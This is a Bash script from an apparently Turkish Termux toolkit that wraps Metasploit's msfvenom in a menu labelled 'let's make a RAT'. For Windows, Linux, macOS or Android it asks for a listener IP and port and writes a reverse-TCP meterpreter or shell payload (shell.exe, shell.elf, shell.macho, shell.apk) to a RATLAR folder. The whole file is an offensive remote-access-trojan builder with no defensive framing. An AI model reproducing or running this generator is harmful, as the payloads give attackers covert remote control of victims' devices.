#!/bin/bash
#Code:keyiflerolsun
#instagram: @keyiflerolsun

clear

banner() {


printf "\e[1;92m _____                              \e[0m\e[1;77m _____ ____\e[0m\n"
printf "\e[1;92m|_   _|__ _ __ _ __ ___  _   ___  _\e[0m\e[1;77m |_   _|  _ \ \e[0m\n"
printf "\e[1;92m  | |/ _ \ '__| '_ ' _ \| | | \ \/ / \e[0m\e[1;77m | | | |_) |\e[0m\n"
printf "\e[1;92m  | |  __/ |  | | | | | | |_| |>  <  \e[0m\e[1;77m | | |  _ <\e[0m\n"
printf "\e[1;92m  |_|\___|_|  |_| |_| |_|\__,_/_/\_\ \e[0m\e[1;77m |_| |_| \_\ \e[0m\n"
  


printf " \e[1;77m v4.2 coded by github.com/keyiflerolsun/TermuxTR\e[0m \n"

printf "\n"


}

banner


[[ `id -u` -eq 0 ]] || { echo -e "\e[31mÖnce ROOT İzni Vermelisin!! ~tsu"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep  > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    service metasploit start
fi 
mkdir /sdcard/RATLAR
clear
clear

banner

  echo -e "\E[1;33m::::: \e[97mHadi RAT Yapalım :) \E[1;33m:::::"

PS3='Hedef Sistem -> '
options=("Windows" "Linux" "Mac" "Android" "Çıkış")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'LHOST IP Belirle: ' uservar; read -p 'LPORT Belirle: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > /sdcard/RATLAR/shell.exe
            echo -e "\E[1;33m::::: \e[97mshell.exe kayıt edildi -> /sdcard/RATLAR \E[1;33m:::::"
            ;;
        "Linux")
            read -p 'LHOST IP Belirle: ' uservar; read -p 'LPORT Belirle: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > /sdcard/RATLAR/shell.elf
            echo -e "\E[1;33m::::: \e[97mshell.elf kayıt edildi -> /sdcard/RATLAR \E[1;33m:::::"
            ;;
        "Mac")
            read -p 'LHOST IP Belirle: ' uservar; read -p 'LPORT Belirle: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > /sdcard/RATLAR/shell.macho
            echo -e "\E[1;33m::::: \e[97mshell.macho kayıt edildi -> /sdcard/RATLAR \E[1;33m:::::"
            ;;
        "Android")
            read -p 'LHOST IP Belirle: ' uservar; read -p 'LPORT Belirle: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > /sdcard/RATLAR/shell.apk
            echo -e "\E[1;33m::::: \e[97mshell.apk kayıt edildi -> /sdcard/RATLAR \E[1;33m:::::"
            ;;  
        "Çıkış")
            echo "Hoşça Kal"
			bash $HOME/TermuxTR/basla.sh
            ;;
    esac
done
